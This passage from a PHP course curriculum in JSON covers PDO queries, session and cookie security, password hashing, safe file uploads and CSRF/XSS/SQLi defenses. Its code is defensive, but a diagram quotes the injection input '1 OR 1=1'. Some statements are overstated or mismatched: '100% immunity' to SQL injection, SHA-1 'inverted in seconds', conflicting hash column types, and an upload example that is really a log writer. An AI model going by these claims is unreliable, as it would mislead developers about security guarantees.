                        "code_architecture": "<?php\n// Comprehensive CRUD Implementation with PDO\n// 1. CREATE\n$stmt = $pdo->prepare('INSERT INTO products (title, price, stock) VALUES (?, ?, ?)');\n$stmt->execute(['Keyboard', 1250.00, 45]);\n$newId = $pdo->lastInsertId();\n\n// 2. READ\n$stmt = $pdo->prepare('SELECT * FROM products WHERE price <= ? ORDER BY price ASC');\n$stmt->execute([2000]);\n$budgetProducts = $stmt->fetchAll();\n\n// 3. UPDATE\n$stmt = $pdo->prepare('UPDATE products SET stock = stock - 1 WHERE id = ?');\n$stmt->execute([$newId]);\n\n// 4. DELETE\n$stmt = $pdo->prepare('DELETE FROM products WHERE id = ?');\n$stmt->execute([$newId]);\n?>"
                    },
                    "diagram": {
                        "caption": "Figure 4.2: Two-Phase Execution of Prepared Statements Neutralizing SQL Injection",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='360' height='200' rx='10' fill='#F7F8FC' stroke='#377FE6' stroke-width='2'/><rect x='20' y='20' width='360' height='34' rx='10' fill='#377FE6'/><text x='200' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>PHASE 1: Query Compilation</text><text x='40' y='80' font-family='monospace' font-size='11' fill='#377FE6'>SELECT * FROM users WHERE id = :id</text><text x='40' y='110' font-family='sans-serif' font-size='11' fill='#19283D'>• SQL template sent to MySQL server</text><text x='40' y='130' font-family='sans-serif' font-size='11' fill='#19283D'>• Query parsed and execution plan compiled</text><text x='40' y='150' font-family='sans-serif' font-size='11' fill='#19283D'>• Placeholder reserved in execution tree</text><text x='40' y='180' font-family='sans-serif' font-size='11' font-weight='600' fill='#28A994'>✓ SQL syntax fixed and immutable</text><rect x='420' y='20' width='360' height='200' rx='10' fill='#F7F8FC' stroke='#28A994' stroke-width='2'/><rect x='420' y='20' width='360' height='34' rx='10' fill='#28A994'/><text x='600' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>PHASE 2: Data Parameter Binding</text><text x='440' y='80' font-family='monospace' font-size='11' fill='#1B6F61'>$stmt->execute([':id' => $input]);</text><text x='440' y='110' font-family='sans-serif' font-size='11' fill='#19283D'>• Parameter sent strictly as raw data</text><text x='440' y='130' font-family='sans-serif' font-size='11' fill='#19283D'>• Malicious input (e.g. '1 OR 1=1') treated as string</text><text x='440' y='150' font-family='sans-serif' font-size='11' fill='#19283D'>• Cannot alter compiled SQL syntax</text><text x='440' y='180' font-family='sans-serif' font-size='11' font-weight='600' fill='#369B72'>✓ 100% Immunity to SQL Injection</text></svg>"
                    },
                    "examples": {
                        "scenario": "Live Product Catalog Search & Table Display",
                        "code": "<?php\nrequire_once 'db.php';\n$search = '%' . ($_GET['q'] ?? '') . '%';\n$stmt = $pdo->prepare('SELECT id, name, price, stock FROM items WHERE name LIKE ? LIMIT 10');\n$stmt->execute([$search]);\n$items = $stmt->fetchAll();\n?>\n<table border='1'>\n  <tr><th>ID</th><th>Name</th><th>Price</th><th>Stock</th></tr>\n  <?php foreach ($items as $it): ?>\n  <tr>\n    <td><?= $it['id'] ?></td>\n    <td><?= htmlspecialchars($it['name']) ?></td>\n    <td>₹<?= number_format($it['price'], 2) ?></td>\n    <td><?= $it['stock'] ?></td>\n  </tr>\n  <?php endforeach; ?>\n</table>"
                    },
                    "important_points": [
                        "Prepared statements separate SQL syntax compilation from user parameter binding.",
                        "Never concatenate raw `$POST` or `$GET` variables into SQL query strings.",
                        "`$pdo->lastInsertId()` retrieves the auto-incremented primary key generated by an INSERT.",
                        "`$stmt->rowCount()` returns the number of rows affected by an UPDATE or DELETE.",
                        "Use `fetchAll()` to retrieve all rows into an array, or iterate with `fetch()` to conserve memory for large datasets."
                    ],
                    "revision": {
                        "summary": "CRUD operations form the backbone of relational database programming. Prepared statements with bound parameters provide complete immunity against SQL injection attacks.",
                        "terminology": "CRUD, Prepared Statement, Parameter Binding, SQL Injection, lastInsertId, rowCount.",
                        "mechanisms": "Query Template -> Database Compile -> Bind Parameters as Literals -> Execute -> Result Cursor.",
                        "common_mistakes": "Concatenating user variables directly into SQL strings (`SELECT * FROM users WHERE id = $id`), introducing severe SQL injection vulnerabilities."
                    }
                }
            ]
        },
        {
            "module_no": 5,
            "title": "Session Management, Authentication, File Handling & Security",
            "hours": 4,
            "marks": 15,
            "topics": [
                {
                    "id": "php_m5_t1",
                    "title": "State Persistence: HTTP Cookies vs PHP Sessions & Session Fixation Defense",
                    "subtopics": ["Cookies Architecture & Security Flags", "Session Lifecycle & session_start()", "Session Hijacking & Session Fixation Defense", "session_regenerate_id() Implementation"],
                    "intro": {
                        "definition": "Session management provides stateful conversational tracking across stateless HTTP request cycles by storing session payloads securely on the server and transmitting a cryptographically random session identifier (PHPSESSID) to the client via HTTP cookies.",
                        "background": "Because HTTP is stateless, early web developers attempted to pass state through URL query parameters or hidden form fields, which created severe security risks. Netscape introduced HTTP cookies in 1994, which PHP integrated into its core session management engine.",
                        "importance": "Secure session handling protects e-commerce shopping carts, university examination logins, and enterprise data from credential theft, session fixation, and cross-site scripting hijacks.",
                        "objectives": [
                            "Differentiate client-side cookies from server-side sessions regarding capacity and security.",
                            "Configure secure cookie flags: HttpOnly, Secure, and SameSite.",
                            "Manage session lifecycles using session_start(), $_SESSION, and session_destroy().",
                            "Prevent session fixation attacks using session_regenerate_id(true)."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "Cookies store key-value data directly inside the client's browser (maximum 4KB). Sessions store data files on the web server's storage, identified by an alphanumeric cookie token stored in the browser (PHPSESSID).",
                        "terminology": [
                            {"term": "PHPSESSID", "definition": "The standard session identifier cookie passed between browser and server to identify session state."},
                            {"term": "HttpOnly", "definition": "Cookie flag preventing JavaScript from reading the cookie via document.cookie, mitigating XSS session theft."},
                            {"term": "SameSite", "definition": "Cookie attribute (Strict/Lax) preventing cookies from being sent on cross-site requests, mitigating CSRF."},
                            {"term": "Session Fixation", "definition": "Attack where an adversary forces a known session ID upon a victim before authentication."}
                        ],
                        "principles": "1. Id Regeneration Rule: Always regenerate the session ID immediately upon user privilege escalation (login).\n2. Confidentiality Rule: Store sensitive user state on the server session, never in plaintext client cookies.",
                        "structures": "session_start(['cookie_httponly' => true, 'cookie_secure' => true, 'cookie_samesite' => 'Strict']); $_SESSION['user_id'] = $id;"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. Client makes request to server.",
                            "2. `session_start()` checks for incoming PHPSESSID cookie in request headers.",
                            "3. If absent: generates a 128-bit random session identifier, creates a session storage file on the server (`/tmp/sess_...`), and sets Set-Cookie header.",
                            "4. If present: reads corresponding server session file and deserializes data into `$_SESSION`.",
                            "5. During successful login, `session_regenerate_id(true)` invalidates the old ID to defeat session fixation.",
                            "6. When logging out, clear `$_SESSION = []`, delete the session cookie, and invoke `session_destroy()`."
                        ],
                        "comparison_table": {
                            "headers": ["Attribute", "HTTP Cookie", "PHP Session ($_SESSION)"],
                            "rows": [
                                ["Storage Location", "Client Browser disk/memory", "Server Storage (/tmp or Redis)"],
                                ["Storage Capacity", "Limited to ~4KB per domain", "Governed only by server memory/disk limits"],
                                ["Security Level", "Vulnerable to client tampering and theft", "High security; data hidden from client"],
                                ["Data Types", "Plaintext strings only", "Complex types (arrays, serialized objects)"],
                                ["Bandwidth Impact", "Transmitted on every HTTP request header", "Only session ID cookie (~32 bytes) transmitted"]
                            ]
                        },
                        "code_architecture": "<?php
// Robust Session Initialization
session_start([
    'cookie_lifetime' => 86400,
    'cookie_httponly' => true,
    'cookie_secure' => true,
    'cookie_samesite' => 'Strict'
]);

// Login privilege escalation
function authenticateUser($userId) {
    session_regenerate_id(true); // Neutralizes session fixation
    $_SESSION['authenticated'] = true;
    $_SESSION['user_id'] = $userId;
    $_SESSION['login_time'] = time();
}
?>"
                    },
                    "diagram": {
                        "caption": "Figure 5.1: Complete Session Management Lifecycle and Session Fixation Defense",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='760' height='200' rx='10' fill='#F7F8FC' stroke='#786CE5' stroke-width='2'/><rect x='20' y='20' width='760' height='34' rx='10' fill='#786CE5'/><text x='400' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>SESSION LIFECYCLE &amp; TOKEN COORDINATION</text><rect x='40' y='75' width='210' height='125' rx='8' fill='#ffffff' stroke='#377FE6' stroke-width='1.5'/><text x='145' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#377FE6' text-anchor='middle'>Client Web Browser</text><text x='55' y='125' font-family='monospace' font-size='10' fill='#19283D'>Cookie: PHPSESSID=a8f9...</text><text x='55' y='150' font-family='sans-serif' font-size='11' fill='#617087'>• HttpOnly: Prevents JS access</text><text x='55' y='170' font-family='sans-serif' font-size='11' fill='#617087'>• SameSite: Strict (Anti-CSRF)</text><path d='M 255 135 L 325 135' stroke='#377FE6' stroke-width='2.5'/><text x='290' y='125' font-family='sans-serif' font-size='9' font-weight='700' fill='#377FE6' text-anchor='middle'>Token</text><rect x='330' y='75' width='210' height='125' rx='8' fill='#ffffff' stroke='#786CE5' stroke-width='1.5'/><text x='435' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#786CE5' text-anchor='middle'>PHP Zend Runtime</text><text x='345' y='125' font-family='monospace' font-size='10' fill='#19283D'>session_start()</text><text x='345' y='150' font-family='sans-serif' font-size='11' fill='#19283D'>• session_regenerate_id()</text><text x='345' y='170' font-family='sans-serif' font-size='11' fill='#369B72'>✓ Invalidates old token</text><path d='M 545 135 L 615 135' stroke='#28A994' stroke-width='2.5'/><text x='580' y='125' font-family='sans-serif' font-size='9' font-weight='700' fill='#28A994' text-anchor='middle'>Lookup</text><rect x='620' y='75' width='140' height='125' rx='8' fill='#ffffff' stroke='#28A994' stroke-width='1.5'/><text x='690' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#28A994' text-anchor='middle'>Server Storage</text><text x='635' y='125' font-family='sans-serif' font-size='10' fill='#19283D'>/tmp/sess_a8f9...</text><text x='635' y='150' font-family='sans-serif' font-size='10' fill='#617087'>• user_id: 42</text><text x='635' y='170' font-family='sans-serif' font-size='10' fill='#617087'>• role: 'student'</text></svg>"
                    },
                    "examples": {
                        "scenario": "Session-Based Authentication Guard",
                        "code": "<?php
session_start();
if (empty($_SESSION['authenticated'])) {
    header('Location: login.php?error=unauthorized');
    exit;
}
echo 'Welcome, ' . htmlspecialchars($_SESSION['username']);
?>"
                    },
                    "important_points": [
                        "`session_start()` must be called before any HTML output is sent to the client.",
                        "`session_regenerate_id(true)` invalidates the existing session ID and issues a fresh token upon login.",
                        "Cookies have a 4KB capacity limit; sessions are bounded only by server resources.",
                        "Setting `HttpOnly` on cookies prevents client-side JavaScript from accessing session tokens.",
                        "`SameSite=Strict` shields session cookies against Cross-Site Request Forgery (CSRF)."
                    ],
                    "revision": {
                        "summary": "State persistence in web apps uses client cookies containing random session IDs mapping to server session files. Security flags (HttpOnly, Secure, SameSite) and ID regeneration are mandatory.",
                        "terminology": "PHPSESSID, session_start, session_regenerate_id, HttpOnly, SameSite, Session Fixation.",
                        "mechanisms": "Browser Request -> Cookie header parsed -> Server file loaded into $_SESSION -> ID regenerated on auth.",
                        "common_mistakes": "Calling `session_start()` after sending HTML content or whitespace, triggering 'headers already sent' warnings."
                    }
                },
                {
                    "id": "php_m5_t2",
                    "title": "User Authentication & Secure Password Hashing: password_hash() & password_verify()",
                    "subtopics": ["Flaws of Legacy Hashing (MD5 & SHA-1)", "Bcrypt & Argon2 Cryptographic Algorithms", "password_hash() & Cost Factor Tuning", "password_verify() Verification Workflow"],
                    "intro": {
                        "definition": "User authentication is the security process of verifying the claimed identity of a user. In modern PHP, authentication relies on cryptographic one-way salted hashing algorithms (Bcrypt and Argon2id) via native APIs.",
                        "background": "Historically, developers stored passwords as plaintext or fast cryptographic hashes like MD5 and SHA-1. Due to high-speed GPU hash crackers and rainbow tables, MD5 and SHA-1 can be inverted in seconds. PHP 5.5 introduced the modern Password Hashing API.",
                        "importance": "Storing passwords securely guarantees that even if the database is compromised, user credentials cannot be reversed or cracked.",
                        "objectives": [
                            "Explain why MD5 and SHA-1 are insecure for password storage.",
                            "Implement password_hash() using PASSWORD_DEFAULT (Bcrypt) and Argon2.",
                            "Verify submitted credentials using password_verify().",
                            "Automatically rehash passwords using password_needs_rehash()."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "A cryptographic password hash is a one-way mathematical function. It incorporates a unique cryptographic salt and an adjustable computational cost factor to make brute-force attacks computationally infeasible.",
                        "terminology": [
                            {"term": "Salt", "definition": "Cryptographically random bytes added to each password before hashing to prevent rainbow table attacks."},
                            {"term": "Bcrypt", "definition": "A key derivation function based on the Blowfish cipher featuring an adjustable work factor."},
                            {"term": "Argon2", "definition": "The winner of the Password Hashing Competition designed to resist GPU/ASIC cracking."},
                            {"term": "password_verify()", "definition": "Timing-attack safe comparison function verifying plain passwords against stored hashes."}
                        ],
                        "principles": "1. Never Store Plaintext: Passwords must be hashed immediately upon receipt.\n2. Work Factor Calibration: Tune cost factors so hashing takes approximately 250-350ms on server hardware.",
                        "structures": "$hash = password_hash($plain, PASSWORD_DEFAULT, ['cost' => 12]); if (password_verify($plain, $hash)) {...}"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. User submits plaintext password via HTTPS POST.",
                            "2. `password_hash($plain, PASSWORD_DEFAULT)` generates a random salt and hashes the password using Bcrypt.",
                            "3. The resulting 60-character string (containing algorithm, cost, salt, and hash) is stored in the database.",
                            "4. On login: Retrieve stored hash for the claimed username.",
                            "5. Execute `password_verify($plain, $storedHash)`.",
                            "6. The function extracts salt and cost from the stored string, hashes the input, and executes a timing-attack safe comparison.",
                            "7. If valid: Grant authentication and check `password_needs_rehash()`. If invalid: Reject login."
                        ],
                        "comparison_table": {
                            "headers": ["Algorithm", "Type", "Brute-Force Resistance", "Status in Modern PHP"],
                            "rows": [
                                ["MD5", "Fast Cryptographic Hash", "Near zero (GPU calculates billions/sec)", "Broken / Insecure"],
                                ["SHA-256", "General Cryptographic Hash", "Poor (designed to be fast, easy to crack)", "Unsuitable for passwords"],
                                ["Bcrypt", "Adaptive Key Derivation", "High (CPU-intensive adjustable cost)", "Standard (PASSWORD_BCRYPT)"],
                                ["Argon2id", "Memory-Hard Key Derivation", "Extremely High (Resists GPU & ASIC rigs)", "Recommended (PASSWORD_ARGON2ID)"]
                            ]
                        },
                        "code_architecture": "<?php
// 1. REGISTRATION: Secure Password Storage
$password = $_POST['password'];
$hashedPassword = password_hash($password, PASSWORD_DEFAULT, ['cost' => 12]);
// Store $hashedPassword into database column CHAR(60)

// 2. LOGIN: Secure Verification
$inputPassword = $_POST['password'];
$storedHash = $user['password_hash']; // Retrieved from database

if (password_verify($inputPassword, $storedHash)) {
    // Authentication success
    session_regenerate_id(true);
    $_SESSION['user_id'] = $user['id'];
} else {
    // Authentication failed (constant-time response)
    $error = 'Invalid credentials';
}
?>"
                    },
                    "diagram": {
                        "caption": "Figure 5.2: Anatomy of a Bcrypt Password Hash and Verification Workflow",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='760' height='200' rx='10' fill='#F7F8FC' stroke='#377FE6' stroke-width='2'/><rect x='20' y='20' width='760' height='34' rx='10' fill='#377FE6'/><text x='400' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>BCRYPT HASH STRUCTURE &amp; TIMING-SAFE VERIFICATION</text><rect x='40' y='75' width='720' height='55' rx='6' fill='#FFFFFF' stroke='#8DB9F0' stroke-width='1.5'/><text x='55' y='108' font-family='monospace' font-size='13' font-weight='700' fill='#19283D'><tspan fill='#D65F64'>$2y$</tspan><tspan fill='#377FE6'>12$</tspan><tspan fill='#786CE5'>N9qo8uLOickgx2ZMRZoMye</tspan><tspan fill='#28A994'>IjZAgcfl7p92ldGxad68LJZdL17lhWy</tspan></text><text x='70' y='155' font-family='sans-serif' font-size='10' font-weight='700' fill='#D65F64'>Algorithm ID</text><text x='165' y='155' font-family='sans-serif' font-size='10' font-weight='700' fill='#377FE6'>Cost Factor (12)</text><text x='310' y='155' font-family='sans-serif' font-size='10' font-weight='700' fill='#786CE5'>22-char Random Salt</text><text x='570' y='155' font-family='sans-serif' font-size='10' font-weight='700' fill='#28A994'>31-char Computed Hash</text><rect x='40' y='175' width='720' height='35' rx='6' fill='#E8F6F3'/><text x='400' y='198' font-family='sans-serif' font-size='11' font-weight='600' fill='#1B6F61' text-anchor='middle'>password_verify() extracts cost &amp; salt, hashes candidate input, and compares in constant time</text></svg>"
                    },
                    "examples": {
                        "scenario": "Live User Registration and Login Script",
                        "code": "<?php
$hash = password_hash('SecretPassword123!', PASSWORD_BCRYPT, ['cost' => 11]);
// Simulated Login Check:
$user_attempt = 'SecretPassword123!';
if (password_verify($user_attempt, $hash)) {
    echo 'Password verified successfully!';
} else {
    echo 'Invalid password.';
}
?>"
                    },
                    "important_points": [
                        "Never use MD5 or SHA-1 for password storage; they are computationally broken.",
                        "`password_hash()` automatically generates a cryptographically secure random salt.",
                        "`password_verify()` protects against timing attacks by comparing hashes in constant time.",
                        "Database password columns should be `VARCHAR(255)` to accommodate future hashing algorithms.",
                        "`password_needs_rehash()` detects when cost factors or default algorithms have been updated."
                    ],
                    "revision": {
                        "summary": "Secure user authentication requires one-way salted hashing. PHP's password_hash() and password_verify() handle salt generation, cost tuning, and timing-safe comparisons.",
                        "terminology": "password_hash, password_verify, Bcrypt, Argon2, Salt, Cost factor.",
                        "mechanisms": "Plain Password -> Random Salt -> Cost Loops -> Stored 60-char String -> password_verify().",
                        "common_mistakes": "Hashing passwords using `md5($password)` or manually concatenating salts, creating vulnerable authentication systems."
                    }
                },
                {
                    "id": "php_m5_t3",
                    "title": "Error Handling & File System Operations: Reading, Writing & Secure Uploads",
                    "subtopics": ["Structured Exceptions (try-catch-finally)", "File Operations (fopen, fread, fwrite, file_get_contents)", "Secure File Upload Pipeline ($_FILES)", "MIME Type Validation & Extension Whitelisting"],
                    "intro": {
                        "definition": "File handling encompasses reading, writing, parsing, and uploading files on the server file system. Secure file management requires strict validation of MIME types, sanitization of file names, and defense against unrestricted executable uploads.",
                        "background": "Unrestricted file upload is one of the most critical web vulnerabilities. If a user uploads a `.php` script into an executable directory, they achieve Remote Code Execution (RCE), completely compromising the host operating system.",
                        "importance": "Web platforms frequently handle student assignments, profile pictures, and PDF reports. Ensuring that uploaded files cannot execute as code is a cornerstone of software security.",
                        "objectives": [
                            "Perform atomic file read and write operations using file_get_contents() and file_put_contents().",
                            "Inspect the $_FILES superglobal array (name, type, tmp_name, error, size).",
                            "Verify MIME types using finfo_file() rather than trusting client extensions.",
                            "Store uploads outside public web roots and randomize stored file names."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "When a file is uploaded via HTTP POST, it is staged in a temporary directory (`/tmp` or `C:\xampp\tmp`). The PHP script must validate and move it to a permanent location using `move_uploaded_file()`.",
                        "terminology": [
                            {"term": "$_FILES", "definition": "Superglobal 2D associative array containing file upload metadata and temporary paths."},
                            {"term": "finfo_file()", "definition": "Fileinfo function inspecting magic byte headers to determine true MIME types."},
                            {"term": "move_uploaded_file()", "definition": "Security function verifying that a file was genuinely uploaded via HTTP POST before moving it."}
                        ],
                        "principles": "1. Never Trust Extension: Client-supplied file extensions can be spoofed; verify binary magic numbers.\n2. Prevent Direct Execution: Store uploads outside the document root or disable script execution in upload folders via `.htaccess` (`php_flag engine off`).",
                        "structures": "$_FILES['doc']['tmp_name'] | move_uploaded_file($tmp, $destination) | file_put_contents($path, $data, LOCK_EX);"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. Form includes `method='POST'` and `enctype='multipart/form-data'`.",
                            "2. User selects file and submits form; PHP populates `$_FILES['upload']`.",
                            "3. Check `$_FILES['upload']['error'] === UPLOAD_ERR_OK`.",
                            "4. Verify file size does not exceed predefined threshold (e.g. 5MB).",
                            "5. Inspect MIME type using PHP's `finfo` extension (`finfo_open(FILEINFO_MIME_TYPE)`).",
                            "6. Validate file extension against an explicit strict whitelist (`['jpg', 'png', 'pdf']`).",
                            "7. Generate a cryptographically random filename using `bin2hex(random_bytes(16))`.",
                            "8. Relocate file via `move_uploaded_file()` to an upload storage folder."
                        ],
                        "comparison_table": {
                            "headers": ["File Function", "Operation Type", "Performance / Memory", "Best Use Case"],
                            "rows": [
                                ["file_get_contents()", "Read entire file", "Loads entire file into RAM", "Reading small configuration or JSON files"],
                                ["file_put_contents()", "Write entire file", "Atomic writing with LOCK_EX", "Writing logs or cached outputs"],
                                ["fopen() / fread()", "Stream chunk reading", "Memory-efficient buffer chunks", "Processing massive CSV or binary datasets"],
                                ["move_uploaded_file()", "Relocate upload", "Fast filesystem rename/move", "Finalizing HTTP multipart uploads"]
                            ]
                        },
                        "code_architecture": "<?php
// Secure File Upload Processing
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['avatar'])) {
    $file = $_FILES['avatar'];
    if ($file['error'] !== UPLOAD_ERR_OK) {
        die('Upload error code: ' . $file['error']);
    }
    // 1. Verify Size (max 2MB)
    if ($file['size'] > 2 * 1024 * 1024) {
        die('File exceeds 2MB limit.');
    }
    // 2. Verify True MIME Type via Magic Bytes
    $finfo = new finfo(FILEINFO_MIME_TYPE);
    $mime = $finfo->file($file['tmp_name']);
    $allowedMimes = ['image/jpeg' => 'jpg', 'image/png' => 'png', 'application/pdf' => 'pdf'];
    if (!array_key_exists($mime, $allowedMimes)) {
        die('Disallowed file format.');
    }
    // 3. Generate Random Name
    $ext = $allowedMimes[$mime];
    $newName = bin2hex(random_bytes(16)) . '.' . $ext;
    $dest = __DIR__ . '/uploads/' . $newName;
    if (move_uploaded_file($file['tmp_name'], $dest)) {
        echo 'Upload successful: ' . htmlspecialchars($newName);
    }
}
?>"
                    },
                    "diagram": {
                        "caption": "Figure 5.3: Multi-Layered Secure File Upload Pipeline",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='760' height='200' rx='10' fill='#F7F8FC' stroke='#377FE6' stroke-width='2'/><rect x='20' y='20' width='760' height='34' rx='10' fill='#377FE6'/><text x='400' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>SECURE FILE UPLOAD VALIDATION PIPELINE</text><rect x='35' y='75' width='160' height='125' rx='8' fill='#ffffff' stroke='#786CE5' stroke-width='1.5'/><text x='115' y='100' font-family='sans-serif' font-size='11' font-weight='700' fill='#786CE5' text-anchor='middle'>1. Error &amp; Size</text><text x='45' y='125' font-family='sans-serif' font-size='10' fill='#19283D'>• Check UPLOAD_ERR_OK</text><text x='45' y='150' font-family='sans-serif' font-size='10' fill='#19283D'>• Enforce &lt; 5MB</text><text x='45' y='175' font-family='sans-serif' font-size='9' fill='#617087'>Rejects oversized data</text><path d='M 200 135 L 225 135' stroke='#377FE6' stroke-width='2'/><rect x='230' y='75' width='160' height='125' rx='8' fill='#ffffff' stroke='#377FE6' stroke-width='1.5'/><text x='310' y='100' font-family='sans-serif' font-size='11' font-weight='700' fill='#377FE6' text-anchor='middle'>2. Magic Bytes</text><text x='240' y='125' font-family='sans-serif' font-size='10' fill='#19283D'>• finfo_file()</text><text x='240' y='150' font-family='sans-serif' font-size='10' fill='#19283D'>• Check binary header</text><text x='240' y='175' font-family='sans-serif' font-size='9' fill='#369B72'>Bypasses fake extensions</text><path d='M 395 135 L 420 135' stroke='#377FE6' stroke-width='2'/><rect x='425' y='75' width='160' height='125' rx='8' fill='#ffffff' stroke='#28A994' stroke-width='1.5'/><text x='505' y='100' font-family='sans-serif' font-size='11' font-weight='700' fill='#28A994' text-anchor='middle'>3. Random Name</text><text x='435' y='125' font-family='sans-serif' font-size='10' fill='#19283D'>• random_bytes(16)</text><text x='435' y='150' font-family='sans-serif' font-size='10' fill='#19283D'>• Prevent path overwrite</text><text x='435' y='175' font-family='sans-serif' font-size='9' fill='#617087'>Eliminates directory traversal</text><path d='M 590 135 L 615 135' stroke='#28A994' stroke-width='2'/><rect x='620' y='75' width='150' height='125' rx='8' fill='#ffffff' stroke='#369B72' stroke-width='1.5'/><text x='695' y='100' font-family='sans-serif' font-size='11' font-weight='700' fill='#369B72' text-anchor='middle'>4. Storage</text><text x='630' y='125' font-family='sans-serif' font-size='10' fill='#19283D'>• move_uploaded_file()</text><text x='630' y='150' font-family='sans-serif' font-size='10' fill='#19283D'>• Non-executable dir</text><text x='630' y='175' font-family='sans-serif' font-size='9' font-weight='600' fill='#369B72'>✓ Safe Persistence</text></svg>"
                    },
                    "examples": {
                        "scenario": "Student ID Card Photo Upload Processing",
                        "code": "<?php
// Simple log file writer
$logEntry = date('Y-m-d H:i:s') . " - Student 101 accessed portal\n";
file_put_contents(__DIR__ . '/access.log', $logEntry, FILE_APPEND | LOCK_EX);
echo 'Access logged.';
?>"
                    },
                    "important_points": [
                        "Always use `move_uploaded_file()` instead of `copy()` or `rename()` for HTTP uploads.",
                        "Inspect file headers using `finfo_file()` to verify real MIME types rather than trusting user extensions.",
                        "Generate new randomized filenames to prevent directory traversal attacks and accidental file overwrites.",
                        "Store uploaded files outside the public web root whenever possible.",
                        "Use `LOCK_EX` when calling `file_put_contents()` to prevent race conditions during concurrent writes."
                    ],
                    "revision": {
                        "summary": "File operations and uploads require multi-layered validation. Inspecting error codes, verifying magic-byte MIME types, generating random filenames, and storing uploads safely prevents code execution.",
                        "terminology": "$_FILES, move_uploaded_file, finfo_file, UPLOAD_ERR_OK, LOCK_EX, Magic Bytes.",
                        "mechanisms": "Multipart POST -> Server /tmp staging -> Size & MIME check -> Randomize Name -> move_uploaded_file().",
                        "common_mistakes": "Trusting `$_FILES['upload']['name']` directly, allowing attackers to upload `shell.php` and execute malicious commands."
                    }
                },
                {
                    "id": "php_m5_t4",
                    "title": "Web Security in PHP: SQL Injection Prevention, XSS Mitigation & CSRF Defense",
                    "subtopics": ["OWASP Top 10 Web Vulnerabilities Overview", "SQL Injection Vector Analysis & Mitigation", "Stored, Reflected & DOM-based XSS", "Cross-Site Request Forgery (CSRF) Tokens"],
                    "intro": {
                        "definition": "Web security encompasses the defensive engineering practices, protocols, and architectural measures applied to shield web applications against unauthorized access, data compromise, and malicious code execution.",
                        "background": "The Open Web Application Security Project (OWASP) identifies Injection (SQLi) and Broken Access Control / Cross-Site Scripting (XSS) consistently as leading internet threats. PHP provides native defenses including prepared statements, output escaping, and CSRF tokens.",
                        "importance": "A single security flaw can lead to catastrophic data leaks, legal penalties under data protection regulations, and total compromise of university databases.",
                        "objectives": [
                            "Explain the attack mechanisms of SQLi, XSS, and CSRF.",
                            "Implement cryptographically secure anti-CSRF token verification.",
                            "Apply Content Security Policy (CSP) HTTP response headers.",
                            "Conduct security audits of user authentication and database queries."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "SQLi targets the database via untrusted input in queries. XSS targets client browsers via injected script execution. CSRF tricks authenticated users into submitting unwanted state-changing requests without their consent.",
                        "terminology": [
                            {"term": "SQLi", "definition": "Exploiting query interpolation to execute arbitrary SQL commands on the database server."},
                            {"term": "XSS", "definition": "Injecting client-side scripts into web pages viewed by other users."},
                            {"term": "CSRF", "definition": "Cross-Site Request Forgery: Forcing an authenticated browser to transmit forged requests to a trusted site."},
                            {"term": "Anti-CSRF Token", "definition": "A secret, unique, unpredictable value generated by the server and validated upon state mutations."}
                        ],
                        "principles": "1. Defense-in-Depth: Never rely on a single layer of security; implement validation, encoding, and authentication simultaneously.\n2. Least Privilege: Database users should only possess the minimum permissions needed (SELECT, INSERT, UPDATE).",
                        "structures": "<input type='hidden' name='csrf_token' value='<?= $_SESSION['csrf_token'] ?>'> | hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. Attacker crafts a malicious link or form on an external site pointing to `https://bank.com/transfer.php`.",
                            "2. Victim visits the malicious site while holding an active authenticated session on `bank.com`.",
                            "3. The browser automatically attaches `bank.com` session cookies to the forged request.",
                            "4. Without CSRF defense, the server executes the transfer believing the user authorized it.",
                            "5. DEFENSE: Server generates a random token: `$_SESSION['csrf_token'] = bin2hex(random_bytes(32))`.",
                            "6. Server injects this token into an invisible input inside legitimate forms.",
                            "7. On submission, server verifies: `hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])`.",
                            "8. Because the attacker's external site cannot read the token (Same-Origin Policy), the forged request is rejected."
                        ],
                        "comparison_table": {
                            "headers": ["Vulnerability", "Target Component", "Primary Threat", "Core Industry Defense"],
                            "rows": [
                                ["SQL Injection (SQLi)", "Database Server (MySQL)", "Data theft, dropped tables, auth bypass", "PDO Prepared Statements with parameter binding"],
                                ["Cross-Site Scripting (XSS)", "Client Web Browser", "Session cookie theft, DOM defacement", "htmlspecialchars(ENT_QUOTES) + CSP headers"],
                                ["Cross-Site Request Forgery", "Authenticated User Session", "Unauthorized state changes, transactions", "Synchronizer CSRF Tokens + SameSite cookies"]
                            ]
                        },
                        "code_architecture": "<?php
// Robust Anti-CSRF Token Generator & Validator
session_start();

// Generate token for form
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
